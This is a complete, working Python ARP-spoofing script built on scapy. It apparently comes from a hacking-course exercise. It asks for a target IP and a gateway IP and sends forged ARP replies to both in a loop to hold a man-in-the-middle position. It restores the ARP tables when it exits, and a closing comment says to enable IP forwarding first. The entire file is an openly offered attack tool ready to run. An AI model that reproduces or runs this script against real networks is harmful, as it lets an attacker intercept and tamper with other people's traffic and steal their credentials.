#!/usr/bin/env python

import scapy.all as scapy  # for arp response
import time  # for delay in sending 
import sys  # to flush the buffer


def get_mac(ip):  # from the netScanner programm to get the mac address of target ip
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1 ,verbose=False)[0]

	return answered_list[0][1].hwsrc  # [0] for answered part of response and [1] for answer of the response sent packet

def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2 , pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)

def restore(victim_ip, router_ip):
	victim_mac = get_mac(victim_ip)
	router_mac = get_mac(router_ip)
	packet = scapy.ARP(op=2, pdst=victim_ip,hwdst=victim_mac,psrc=router_ip,hwsrc=router_mac)
	scapy.send(packet , count=4, verbose=False)


target_ip = input("Enter your target's IP Adress: ")
getway_ip = input("Enter the getway IP Adress: ")

try:
	count = 2
	while True:  # to keep sending the spoof packets so that we can maintain the mitm access.
		spoof(target_ip,getway_ip)  # spoofing target saying i'm router
		spoof(getway_ip,target_ip)  # spoofing router saying i'm target
		print("\r[+] Packet sent: " + str(count)+" " , end="")  # we used end to print all sent info in one line
		# \r will remove the print which was printed before, and overwrite the new print ('\r'- carriage return)
		# by doing end python will print this in buffer in order to overcome that we use sys
		sys.stdout.flush()  # to flush the buffer and print it
		count += 2
		time.sleep(2)

except KeyboardInterrupt:
	print(" Detected ctrl+c\n[-] Quiting Program")
	print("[*] Reseting target connection")
	restore(target_ip,getway_ip)
	restore(getway_ip,target_ip)

except Exception :
	print(" There seems to be an error\n[-] Try again")
	print("[*] Reseting target connection")
	restore(target_ip,getway_ip)
	restore(getway_ip,target_ip)

'''
Before running this script run this cmd:
	echo 1 > proc/sys/net/ipv4/ip_forward
so that you'r machine will allow the request flow
'''

